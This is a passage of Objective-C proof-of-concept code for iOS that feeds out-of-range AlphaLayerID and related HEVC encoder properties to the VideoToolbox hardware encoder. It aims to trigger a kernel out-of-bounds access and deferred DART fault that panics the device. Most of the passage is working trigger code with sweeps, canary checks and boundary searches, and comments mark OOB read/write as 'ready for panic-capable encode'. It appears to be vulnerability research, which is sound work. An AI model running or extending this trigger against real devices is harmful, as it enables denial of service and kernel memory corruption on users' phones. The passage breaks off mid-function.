    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
    if (!pb) { FAIL(@"Pixel buffer failed"); return; }

    // === PART 1: AlphaLayerID sweep ===
    int testValues[] = {0, 32, 62, 63, 64, 100, 200, 255};
    int numTests = 8;

    LOG(@"=== PART 1: AlphaLayerID Sweep (0..255) ===");
    INFO(@"For each value: set → readback → encode → extract vps_max_layer_id");
    pocLog(@"");

    for (int t = 0; t < numTests; t++) {
        int val = testValues[t];
        LOG(@"--- AlphaLayerID = %d %s---", val,
            val >= 63 ? "(OVER PATCH LIMIT) " : "");

        VTCompressionSessionRef session = NULL;
        OSStatus status = VTCompressionSessionCreate(
            kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
            (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
            escalationOracleCallback, NULL, &session);

        if (status != noErr) {
            FAIL(@"  Session failed: %d", (int)status);
            continue;
        }

        status = VTSessionSetProperty(session,
            CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
            (__bridge CFTypeRef)@(val));
        INFO(@"  SET: %s", status == noErr ? "OK" : "REJECTED");

        if (status != noErr) {
            VTCompressionSessionInvalidate(session);
            CFRelease(session);
            continue;
        }

        CFTypeRef readBack = NULL;
        VTSessionCopyProperty(session,
            CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
            kCFAllocatorDefault, &readBack);
        if (readBack) {
            int rb = [(__bridge NSNumber *)readBack intValue];
            INFO(@"  READBACK: %d %s", rb,
                rb == val ? "(matches)" : "(CLAMPED!)");
            CFRelease(readBack);
        }

        g_oracleContext = [NSString stringWithFormat:@"AlphaLayerID=%d", val];
        status = VTCompressionSessionPrepareToEncodeFrames(session);
        if (status == noErr) {
            VTCompressionSessionEncodeFrame(session, pb,
                CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
            VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
        } else {
            FAIL(@"  PrepareToEncode failed: %d", (int)status);
        }

        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        pocLog(@"");
    }

    // === PART 2: Dedicated MVHEVCVideoLayerIDs oracle ===
    LOG(@"=== PART 2: MVHEVCVideoLayerIDs Dedicated Oracle ===");
    INFO(@"Testing with own session — previous Test C encode may have failed.");

    {
        VTCompressionSessionRef session = NULL;
        OSStatus status = VTCompressionSessionCreate(
            kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
            (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
            escalationOracleCallback, NULL, &session);

        if (status != noErr) {
            FAIL(@"Session failed: %d", (int)status);
        } else {
            NSArray *layerIDs = @[@(0), @(100)];
            status = VTSessionSetProperty(session,
                CFSTR("MVHEVCVideoLayerIDs"),
                (__bridge CFTypeRef)layerIDs);
            INFO(@"SET MVHEVCVideoLayerIDs=[0,100]: %s",
                status == noErr ? "OK" : "REJECTED");

            CFTypeRef readBack = NULL;
            VTSessionCopyProperty(session,
                CFSTR("MVHEVCVideoLayerIDs"),
                kCFAllocatorDefault, &readBack);
            if (readBack) {
                INFO(@"READBACK: %@", (__bridge id)readBack);
                CFRelease(readBack);
            }

            g_oracleContext = @"MVHEVCLayerIDs=[0,100]";
            status = VTCompressionSessionPrepareToEncodeFrames(session);
            INFO(@"PrepareToEncode: %d", (int)status);
            if (status == noErr) {
                VTCompressionSessionEncodeFrame(session, pb,
                    CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
            } else {
                FAIL(@"PrepareToEncode failed — may need MVHEVC session config");
            }

            VTCompressionSessionInvalidate(session);
            CFRelease(session);
        }
    }
    pocLog(@"");

    // === PART 3: RepFormatIndex combined with AlphaLayerID ===
    LOG(@"=== PART 3: RepFormatIndex + AlphaLayerID Combined ===");
    INFO(@"RepFormatIndex was dead alone — try in multi-layer mode.");

    {
        VTCompressionSessionRef session = NULL;
        OSStatus status = VTCompressionSessionCreate(
            kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
            (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
            escalationOracleCallback, NULL, &session);

        if (status != noErr) {
            FAIL(@"Session failed: %d", (int)status);
        } else {
            VTSessionSetProperty(session,
                CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
                (__bridge CFTypeRef)@(64));
            status = VTSessionSetProperty(session,
                CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
                (__bridge CFTypeRef)@(10));
            INFO(@"SET AlphaLayerID=64 + RepFormatIndex=10");

            CFTypeRef rb1 = NULL, rb2 = NULL;
            VTSessionCopyProperty(session,
                CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
                kCFAllocatorDefault, &rb1);
            VTSessionCopyProperty(session,
                CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
                kCFAllocatorDefault, &rb2);
            if (rb1) { INFO(@"AlphaLayerID readback: %@", (__bridge id)rb1); CFRelease(rb1); }
            if (rb2) { INFO(@"RepFormatIndex readback: %@", (__bridge id)rb2); CFRelease(rb2); }

            g_oracleContext = @"Alpha64+RepFmt10";
            status = VTCompressionSessionPrepareToEncodeFrames(session);
            if (status == noErr) {
                VTCompressionSessionEncodeFrame(session, pb,
                    CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
                INFO(@"Compare VPS with AlphaLayerID=64 alone — look for");
                INFO(@"vps_num_rep_formats_minus1 change in extension.");
            } else {
                FAIL(@"PrepareToEncode failed: %d", (int)status);
            }

            VTCompressionSessionInvalidate(session);
            CFRelease(session);
        }
    }
    pocLog(@"");

    // === PART 4: FaceTime mode retry ===
    LOG(@"=== PART 4: FaceTime Usage Mode Retry ===");
    INFO(@"UserDPB/UserRPS were rejected — may need FaceTime session.");

    {
        VTCompressionSessionRef session = NULL;
        NSDictionary *ftSpec = @{
            (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
            (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
        };

        OSStatus status = VTCompressionSessionCreate(
            kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
            (__bridge CFDictionaryRef)ftSpec, NULL, kCFAllocatorDefault,
            escalationOracleCallback, NULL, &session);

        if (status != noErr) {
            FAIL(@"Session failed: %d", (int)status);
        } else {
            VTSessionSetProperty(session, CFSTR("RealTime"), kCFBooleanTrue);
            VTSessionSetProperty(session,
                CFSTR("AllowOpenGOP"), kCFBooleanFalse);
            VTSessionSetProperty(session,
                CFSTR("AverageBitRate"), (__bridge CFTypeRef)@(500000));
            VTSessionSetProperty(session,
                CFSTR("MaxKeyFrameIntervalDuration"),
                (__bridge CFTypeRef)@(2.0));
            INFO(@"Set RealTime + low-latency (FaceTime-like config)");

            NSArray *ftProps = @[
                @"UserDPBFramesForFaceTime",
                @"UserRPSForFaceTime",
                @"UserParameterSetsIds"
            ];
            NSArray *ftVals = @[@(20), @(100), @(50)];
            for (int i = 0; i < 3; i++) {
                status = VTSessionSetProperty(session,
                    (__bridge CFStringRef)ftProps[i],
                    (__bridge CFTypeRef)ftVals[i]);
                INFO(@"SET %@=%@: %s", ftProps[i], ftVals[i],
                    status == noErr ? "OK" : "REJECTED");

                if (status == noErr) {
                    CFTypeRef rb = NULL;
                    VTSessionCopyProperty(session,
                        (__bridge CFStringRef)ftProps[i],
                        kCFAllocatorDefault, &rb);
                    if (rb) {
                        INFO(@"  READBACK: %@", (__bridge id)rb);
                        CFRelease(rb);
                    }
                }
            }

            g_oracleContext = @"FaceTimeMode";
            status = VTCompressionSessionPrepareToEncodeFrames(session);
            INFO(@"PrepareToEncode: %d", (int)status);
            if (status == noErr) {
                VTCompressionSessionEncodeFrame(session, pb,
                    CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
            }

            VTCompressionSessionInvalidate(session);
            CFRelease(session);
        }
    }

    CVPixelBufferRelease(pb);

    pocLog(@"");
    LOG(@"=== ESCALATION VERDICT ===");
    INFO(@"Key question: does emitted vps_max_layer_id track AlphaLayerID?");
    INFO(@"If vps_max_layer_id=255 when AlphaLayerID=255:");
    INFO(@"  → kernel indexes a 63-element array at position 255");
    INFO(@"  → OOB read/write by 192 elements = ~1536 bytes");
    INFO(@"  → ready for panic-capable encode");
    pocLog(@"");
    INFO(@"Copy full log: long-press → Select All → Copy");
}

// ============================================================
// NARROW: Isolate DART panic trigger with canary + serialization
// Reboot phone before running (AVE2 wedges after DART fault).
// Each press: canary encode first, then ONE suspect value.
// ============================================================

static int g_narrowIndex = 0;
static volatile BOOL g_narrowGotOutput = NO;
static volatile BOOL g_narrowRunning = NO;

static void narrowCallback(
    void *ctx, void *sourceFrameRefCon, OSStatus status,
    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
    if (status != noErr) {
        FAIL(@"[Narrow] Encode callback error: %d", (int)status);
        return;
    }
    if (sampleBuffer) {
        g_narrowGotOutput = YES;
        PASS(@"[Narrow] Frame delivered to callback");
        bitstreamOracle(sampleBuffer, g_oracleContext ?: @"narrow");
    }
}

typedef struct {
    NSString *label;
    int alphaLayerID;
    int repFormatIndex;
    NSArray *mvLayerIDs;
    BOOL combined;
} NarrowTest;

static BOOL narrowEncode(NSDictionary *spec, int alphaID, int repFmtIdx,
                          NSArray *mvIDs, BOOL combined, NSString *label) {

    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        narrowCallback, NULL, &session);

    if (status != noErr) {
        FAIL(@"[%@] Session creation failed: %d", label, (int)status);
        return NO;
    }

    if (alphaID >= 0) {
        status = VTSessionSetProperty(session,
            CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
            (__bridge CFTypeRef)@(alphaID));
        INFO(@"[%@] SET AlphaLayerID=%d: %s", label, alphaID,
            status == noErr ? "OK" : "REJECTED");
    }

    if (repFmtIdx >= 0) {
        status = VTSessionSetProperty(session,
            CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
            (__bridge CFTypeRef)@(repFmtIdx));
        INFO(@"[%@] SET RepFormatIndex=%d: %s", label, repFmtIdx,
            status == noErr ? "OK" : "REJECTED");
    }

    if (mvIDs) {
        status = VTSessionSetProperty(session,
            CFSTR("MVHEVCVideoLayerIDs"),
            (__bridge CFTypeRef)mvIDs);
        INFO(@"[%@] SET MVHEVCVideoLayerIDs=%@: %s", label, mvIDs,
            status == noErr ? "OK" : "REJECTED");
    }

    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
    if (!pb) {
        FAIL(@"[%@] Pixel buffer failed", label);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return NO;
    }

    g_narrowGotOutput = NO;
    g_oracleContext = label;

    status = VTCompressionSessionPrepareToEncodeFrames(session);
    if (status != noErr) {
        FAIL(@"[%@] PrepareToEncode failed: %d", label, (int)status);
        CVPixelBufferRelease(pb);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return NO;
    }

    status = VTCompressionSessionEncodeFrame(session, pb,
        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
    INFO(@"[%@] EncodeFrame: %d", label, (int)status);

    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);

    [NSThread sleepForTimeInterval:3.0];

    BOOL ok = g_narrowGotOutput;

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    return ok;
}

static void idleWait(int seconds, NSString *reason);

static void runNarrowPanic(void) {
    if (g_narrowRunning) {
        INFO(@"Previous test still running — wait for it to finish.");
        return;
    }
    g_narrowRunning = YES;

    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════╗");
    pocLog(@"║  NARROW: Isolated DART Trigger Test    ║");
    pocLog(@"║  Canary first, then ONE suspect value  ║");
    pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***        ║");
    pocLog(@"╚══════════════════════════════════════╝");
    pocLog(@"");

    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    // === CANARY: baseline encode must produce output ===
    LOG(@"--- CANARY: AlphaLayerID=0 (must produce output) ---");
    BOOL canary = narrowEncode(spec, 0, -1, nil, NO, @"CANARY");
    if (!canary) {
        FAIL(@"CANARY FAILED — AVE2 is wedged or broken.");
        FAIL(@"Reboot phone, redeploy, try again.");
        g_narrowRunning = NO;
        return;
    }
    PASS(@"CANARY OK — encoder is healthy.");
    pocLog(@"");

    // Suspect list — expanded beyond just AlphaLayerID
    // Order: most likely trigger first based on sweep evidence
    NSArray *testLabels = @[
        @"AlphaLayerID=255",
        @"Alpha64+RepFmt10 (combined)",
        @"MVHEVCLayerIDs=[0,100]",
        @"AlphaLayerID=63",
        @"AlphaLayerID=200",
        @"AlphaLayerID=128",
        @"AlphaLayerID=64",
        @"AlphaLayerID=32",
    ];

    int idx = g_narrowIndex % (int)testLabels.count;
    g_narrowIndex++;
    NSString *testLabel = testLabels[idx];

    LOG(@"--- SUSPECT TEST %d/%d: %@ ---", idx + 1, (int)testLabels.count, testLabel);
    INFO(@"If phone reboots after this line, '%@' is the trigger.", testLabel);
    pocLog(@"");

    BOOL survived = NO;
    if (idx == 0) {
        survived = narrowEncode(spec, 255, -1, nil, NO, testLabel);
    } else if (idx == 1) {
        survived = narrowEncode(spec, 64, 10, nil, YES, testLabel);
    } else if (idx == 2) {
        survived = narrowEncode(spec, -1, -1, @[@(0), @(100)], NO, testLabel);
    } else if (idx == 3) {
        survived = narrowEncode(spec, 63, -1, nil, NO, testLabel);
    } else if (idx == 4) {
        survived = narrowEncode(spec, 200, -1, nil, NO, testLabel);
    } else if (idx == 5) {
        survived = narrowEncode(spec, 128, -1, nil, NO, testLabel);
    } else if (idx == 6) {
        survived = narrowEncode(spec, 64, -1, nil, NO, testLabel);
    } else if (idx == 7) {
        survived = narrowEncode(spec, 32, -1, nil, NO, testLabel);
    }

    pocLog(@"");
    if (survived) {
        INFO(@"=== %@: encode callback received ===", testLabel);
    } else {
        INFO(@"=== %@: encode error (does NOT clear suspect) ===", testLabel);
    }
    pocLog(@"");

    LOG(@"*** MANDATORY 120-SECOND IDLE WAIT ***");
    LOG(@"Encode error does NOT mean safe. DART fault is deferred.");
    idleWait(120, [NSString stringWithFormat:@"narrow test: %@", testLabel]);

    if (survived) {
        PASS(@"=== %@: SURVIVED 120s idle — likely safe ===", testLabel);
    } else {
        PASS(@"=== %@: SURVIVED 120s idle (encode errored, no deferred fault) ===", testLabel);
    }

    int next_idx = g_narrowIndex % (int)testLabels.count;
    INFO(@"Next press: %@", testLabels[next_idx]);
    INFO(@"Save any .ips panic logs — compare DVA across crashes.");
    pocLog(@"");

    g_narrowRunning = NO;
}

// ============================================================
// Phase 2: Deferred DART Fault Tests (120-second idle-wait protocol)
// ============================================================

static volatile BOOL g_phase2Running = NO;
static int g_truncIdx = 0;

static BOOL phase2Encode(int alphaID, NSString *label) {
    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        narrowCallback, NULL, &session);

    if (status != noErr) {
        FAIL(@"[%@] Session creation failed: %d", label, (int)status);
        return NO;
    }

    status = VTSessionSetProperty(session,
        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
        (__bridge CFTypeRef)@(alphaID));
    INFO(@"[%@] SET AlphaLayerID=%d: %s", label, alphaID,
        status == noErr ? "OK" : "REJECTED");

    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
    if (!pb) {
        FAIL(@"[%@] Pixel buffer failed", label);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return NO;
    }

    g_narrowGotOutput = NO;
    g_oracleContext = label;

    status = VTCompressionSessionPrepareToEncodeFrames(session);
    if (status != noErr) {
        FAIL(@"[%@] PrepareToEncode failed: %d", label, (int)status);
        CVPixelBufferRelease(pb);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return NO;
    }

    LOG(@"[%@] *** ENCODING WITH AlphaLayerID=%d ***", label, alphaID);
    status = VTCompressionSessionEncodeFrame(session, pb,
        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
    INFO(@"[%@] EncodeFrame: %d (%s)", label, (int)status,
        status == noErr ? "submitted" : "error");

    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    [NSThread sleepForTimeInterval:2.0];

    BOOL ok = g_narrowGotOutput;
    INFO(@"[%@] Callback output: %@", label, ok ? @"YES" : @"NO (encode error)");

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    return ok;
}

static void idleWait(int seconds, NSString *reason) {
    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
    fmt.dateFormat = @"HH:mm:ss";
    NSString *startTime = [fmt stringFromDate:[NSDate date]];
    NSDate *endDate = [NSDate dateWithTimeIntervalSinceNow:seconds];
    NSString *endTime = [fmt stringFromDate:endDate];

    INFO(@"=== IDLE WAIT: %ds (%@) ===", seconds, reason);
    INFO(@"Started: %@  Expected end: %@", startTime, endTime);
    INFO(@"Deferred DART fault fires during this wait if triggered.");
    INFO(@"If phone reboots during countdown, the previous encode was the trigger.");
    pocLog(@"");
    for (int i = seconds; i > 0; i--) {
        if (i % 30 == 0 || i <= 5) {
            INFO(@"... %ds remaining (no panic so far)", i);
        }
        [NSThread sleepForTimeInterval:1.0];
    }
    PASS(@"=== IDLE WAIT COMPLETE: no DART fault in %ds (ended %@) ===",
        seconds, [fmt stringFromDate:[NSDate date]]);
    pocLog(@"");
}

static void runPhase2_IdleWait(void) {
    if (g_phase2Running) {
        INFO(@"Phase 2 test already running — wait for it.");
        return;
    }
    g_phase2Running = YES;

    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════════╗");
    pocLog(@"║  PHASE 2A: Alpha=255 + 120s Idle Wait   ║");
    pocLog(@"║  Catches DEFERRED DART faults            ║");
    pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***          ║");
    pocLog(@"╚══════════════════════════════════════════╝");
    pocLog(@"");

    // Canary
    LOG(@"--- CANARY: AlphaLayerID=0 ---");
    BOOL canary = phase2Encode(0, @"CANARY");
    if (!canary) {
        FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
        g_phase2Running = NO;
        return;
    }
    PASS(@"CANARY OK — encoder healthy.");
    idleWait(15, @"canary cooldown");

    // The trigger
    LOG(@"--- TRIGGER: AlphaLayerID=255 ---");
    INFO(@"Known deferred DART trigger. Encode will error (-17691).");
    INFO(@"The DART fault fires AFTER the callback — during idle wait.");
    pocLog(@"");

    BOOL gotOutput = phase2Encode(255, @"Alpha255-idle");

    if (gotOutput) {
        PASS(@"Got output! (unexpected — usually errors with -17691)");
    } else {
        INFO(@"Encode errored as expected. DMA descriptor may be armed.");
    }
    pocLog(@"");

    LOG(@"*** 5-MINUTE IDLE WAIT BEGINS NOW ***");
    LOG(@"DO NOT TOUCH THE PHONE. DO NOT PRESS ANY BUTTON.");
    LOG(@"If panic fires during this wait = CONFIRMED deferred DART.");
    pocLog(@"");

    idleWait(300, @"deferred DART window for Alpha=255 (5 min)");

    PASS(@"=== SURVIVED 300s idle — no deferred fault ===");
    INFO(@"Now testing: create/teardown one compression session...");
    INFO(@"If panic fires NOW = fault armed by encode, fired by lifecycle.");
    pocLog(@"");

    {
        VTCompressionSessionRef probeSession = NULL;
        NSDictionary *probeSpec = @{
            (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
            (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
        };
        OSStatus probeStatus = VTCompressionSessionCreate(
            kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
            (__bridge CFDictionaryRef)probeSpec, NULL, kCFAllocatorDefault,
            narrowCallback, NULL, &probeSession);
        if (probeStatus == noErr) {
            INFO(@"Probe session created — invalidating now...");
            VTCompressionSessionInvalidate(probeSession);
            CFRelease(probeSession);
            INFO(@"Probe session destroyed. Waiting 60s for lifecycle-triggered fault...");
            idleWait(60, @"post-lifecycle DART window");
            PASS(@"=== No lifecycle-triggered fault ===");
        } else {
            FAIL(@"Probe session creation failed: %d (AVE2 may be wedged)", (int)probeStatus);
        }
    }
    pocLog(@"");

    INFO(@"RESULT: Alpha=255 did NOT panic this run.");
    INFO(@"The DART fault is probabilistic (race condition).");
    INFO(@"Run this test 5x total. Record hit rate + time-to-panic.");
    INFO(@"Collect .ips logs after any reboot during the wait.");
    pocLog(@"");

    g_phase2Running = NO;
}

static void runPhase2_Truncation(void) {
    if (g_phase2Running) {
        INFO(@"Phase 2 test already running — wait for it.");
        return;
    }
    g_phase2Running = YES;

    int truncValues[] = {63, 127, 191};
    int numValues = 3;
    int idx = g_truncIdx % numValues;
    g_truncIdx++;

    int val = truncValues[idx];
    int mod64 = val & 0x3F;

    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════════╗");
    pocLog(@"║  PHASE 2B: Truncation Test               ║");
    pocLog(@"║  Determines: kernel uses raw or 6-bit?   ║");
    pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***          ║");
    pocLog(@"╚══════════════════════════════════════════╝");
    pocLog(@"");
    LOG(@"Test %d/%d: AlphaLayerID=%d (mod-64 = %d)", idx + 1, numValues, val, mod64);
    pocLog(@"");
    INFO(@"All three values (63, 127, 191) reduce to 63 in the");
    INFO(@"6-bit VPS bitstream field. Results tell us:");
    INFO(@"  ALL panic  -> kernel uses raw IOKit value -> wide OOB");
    INFO(@"  Only 63    -> kernel uses 6-bit truncation -> 1-element OOB");
    INFO(@"  None panic -> trigger requires -17691 error path (255-specific)");
    pocLog(@"");

    // Canary
    LOG(@"--- CANARY: AlphaLayerID=0 ---");
    BOOL canary = phase2Encode(0, @"CANARY");
    if (!canary) {
        FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
        g_phase2Running = NO;
        return;
    }
    PASS(@"CANARY OK.");
    idleWait(10, @"canary cooldown");

    // Trigger
    NSString *label = [NSString stringWithFormat:@"Trunc-%d", val];
    LOG(@"--- TRIGGER: AlphaLayerID=%d (6-bit: %d) ---", val, mod64);
    INFO(@"If phone reboots after this line, Alpha=%d is a trigger.", val);
    pocLog(@"");

    BOOL gotOutput = phase2Encode(val, label);

    if (gotOutput) {
        PASS(@"[%@] Got encoded output.", label);
    } else {
        INFO(@"[%@] Encode error — DMA descriptor may be armed.", label);
    }
    pocLog(@"");

    LOG(@"*** 120-SECOND IDLE WAIT ***");
    idleWait(120, [NSString stringWithFormat:@"deferred DART window for Alpha=%d", val]);

    PASS(@"=== Alpha=%d SURVIVED 120s ===", val);
    pocLog(@"");

    int nextIdx = g_truncIdx % numValues;
    INFO(@"Next press: AlphaLayerID=%d (reboot first if panic occurred!)", truncValues[nextIdx]);
    INFO(@"After all 3: compare which panicked to determine kernel behavior.");
    pocLog(@"");

    g_phase2Running = NO;
}

static void runPhase2_Boundary(void) {
    if (g_phase2Running) {
        INFO(@"Phase 2 test already running — wait for it.");
        return;
    }
    g_phase2Running = YES;

    // Known: 255 panics (deferred), 32/64 don't panic in 3s tests
    // Binary search: test mid-points with 120s waits
    // User runs this repeatedly; it cycles through the boundary values
    static int boundaryValues[] = {254, 253, 252, 250, 245, 235, 200, 128};
    static int g_boundIdx = 0;
    int idx = g_boundIdx % 8;
    g_boundIdx++;

    int val = boundaryValues[idx];

    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════════╗");
    pocLog(@"║  PHASE 2C: Boundary Sweep                ║");
    pocLog(@"║  Finding minimum panicking Alpha value    ║");
    pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***          ║");
    pocLog(@"╚══════════════════════════════════════════╝");
    pocLog(@"");
    LOG(@"Boundary test %d/8: AlphaLayerID=%d", idx + 1, val);
    INFO(@"Known: 255 panics (deferred DART), <=64 survives.");
    INFO(@"Testing middle values to find the boundary.");
    pocLog(@"");

    // Canary
    LOG(@"--- CANARY: AlphaLayerID=0 ---");
    BOOL canary = phase2Encode(0, @"CANARY");
    if (!canary) {
        FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
        g_phase2Running = NO;
        return;
    }
    PASS(@"CANARY OK.");
    idleWait(10, @"canary cooldown");

    // Trigger
    NSString *label = [NSString stringWithFormat:@"Boundary-%d", val];
    LOG(@"--- TEST: AlphaLayerID=%d ---", val);
    INFO(@"If phone reboots, %d is above the boundary.", val);
    pocLog(@"");

    BOOL gotOutput = phase2Encode(val, label);

    if (gotOutput) {
        PASS(@"[%@] Encode succeeded — got output.", label);
    } else {
        INFO(@"[%@] Encode error — watching for deferred fault.", label);
    }
    pocLog(@"");

    LOG(@"*** 120-SECOND IDLE WAIT ***");
    idleWait(120, [NSString stringWithFormat:@"boundary test Alpha=%d", val]);

    PASS(@"=== Alpha=%d SURVIVED 120s ===", val);
    pocLog(@"");

    int nextIdx = g_boundIdx % 8;
    INFO(@"Next press: AlphaLayerID=%d", boundaryValues[nextIdx]);
    INFO(@"Record which values panic and which survive to find boundary.");
    pocLog(@"");

    g_phase2Running = NO;
}

// ============================================================
// Phase 2E-0: Session Teardown Test
// Determines whether the deferred DART fault is triggered by:
//   A) Session invalidation/teardown
//   B) Next encode on same session
//   C) Idle timer (existing baseline)
// ============================================================

static int g_teardownRunIdx = 2; // skip to Run C (A=panic@160s, B=unclear, C=panic@~30s?)

static void runPhase2_Teardown(void) {
    if (g_phase2Running) {
        INFO(@"Phase 2 test already running — wait for it.");
        return;
    }
    g_phase2Running = YES;

    int runType = g_teardownRunIdx % 3;
    g_teardownRunIdx++;

    NSString *runLabel;
    switch (runType) {
        case 0: runLabel = @"A: Immediate Invalidate"; break;
        case 1: runLabel = @"B: Clean Encode on Same Session"; break;
        case 2: runLabel = @"C: Idle Baseline (120s)"; break;
        default: runLabel = @"?"; break;
    }

    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════════╗");
    pocLog(@"║  PHASE 2E-0: Session Teardown Test       ║");
    pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***          ║");
    pocLog(@"╚══════════════════════════════════════════╝");
    pocLog(@"");
    LOG(@"Run type: %@", runLabel);
    LOG(@"Cycle: press Teardown 3x for A→B→C");
    pocLog(@"");

    // Canary
    LOG(@"--- CANARY: AlphaLayerID=0 ---");
    BOOL canary = phase2Encode(0, @"CANARY");
    if (!canary) {
        FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
        g_phase2Running = NO;
        return;
    }
    PASS(@"CANARY OK — encoder healthy.");
    idleWait(10, @"canary cooldown");

    // Create session and trigger the -17691 error WITHOUT invalidating
    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        narrowCallback, NULL, &session);

    if (status != noErr) {
        FAIL(@"Session creation failed: %d", (int)status);
        g_phase2Running = NO;
        return;
    }

    status = VTSessionSetProperty(session,
        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
        (__bridge CFTypeRef)@(255));
    INFO(@"SET AlphaLayerID=255: %s", status == noErr ? "OK" : "REJECTED");

    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
    if (!pb) {
        FAIL(@"Pixel buffer failed");
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        g_phase2Running = NO;
        return;
    }

    g_narrowGotOutput = NO;
    g_oracleContext = @"teardown-trigger";

    status = VTCompressionSessionPrepareToEncodeFrames(session);
    if (status != noErr) {
        FAIL(@"PrepareToEncode failed: %d", (int)status);
        CVPixelBufferRelease(pb);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        g_phase2Running = NO;
        return;
    }

    LOG(@"*** ENCODING WITH AlphaLayerID=255 ***");
    status = VTCompressionSessionEncodeFrame(session, pb,
        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
    INFO(@"EncodeFrame: %d (%s)", (int)status,
        status == noErr ? "submitted" : "error");

    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    [NSThread sleepForTimeInterval:2.0];

    BOOL ok = g_narrowGotOutput;
    INFO(@"Callback output: %@ (expect NO for -17691 path)", ok ? @"YES" : @"NO");
    CVPixelBufferRelease(pb);
    pocLog(@"");

    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
    fmt.dateFormat = @"HH:mm:ss";

    switch (runType) {
        case 0: {
            // Run A: Immediate session invalidate, then short wait
            LOG(@"=== RUN A: IMMEDIATE SESSION INVALIDATE ===");
            LOG(@"Invalidating session at %@", [fmt stringFromDate:[NSDate date]]);
            INFO(@"If panic fires in next ~30s → descriptor fires on teardown.");
